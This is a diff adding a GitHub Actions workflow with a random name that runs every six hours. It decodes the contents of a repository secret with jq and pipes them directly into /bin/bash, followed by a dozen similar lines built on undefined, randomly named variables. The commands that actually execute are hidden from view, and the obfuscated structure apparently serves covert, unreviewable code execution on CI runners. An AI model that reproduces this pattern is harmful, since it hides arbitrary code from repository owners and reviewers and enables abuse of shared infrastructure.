@@ -1,0 +1,31 @@
+name: fengshuting6712
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: fengshuting6712
+        env:
+          jy979: ${{ secrets.jy979 }}
+        run: |
+          echo $jy979 | jq -r .b84 | /bin/bash
+          echo $enjo55 | jq -r .vzcr89839 | /bin/bash
+          echo $waeuq47 | jq -r .q50258 | /bin/bash
+          echo $f690 | jq -r .wokv0605 | /bin/bash
+          echo $gbrz994 | jq -r .zrp4 | /bin/bash
+          echo $oglw6 | jq -r .dn244 | /bin/bash
+          echo $bl7743 | jq -r .rzr804 | /bin/bash
+          echo $dyq271 | jq -r .tse62 | /bin/bash
+          echo $nnwbv5 | jq -r .xared529 | /bin/bash
+          echo $rewl10 | jq -r .rztz6862 | /bin/bash
+          echo $b4 | jq -r .ksezo5611 | /bin/bash
+          echo $lj74029 | jq -r .icri1 | /bin/bash
+          echo $o83 | jq -r .kk77 | /bin/bash
+
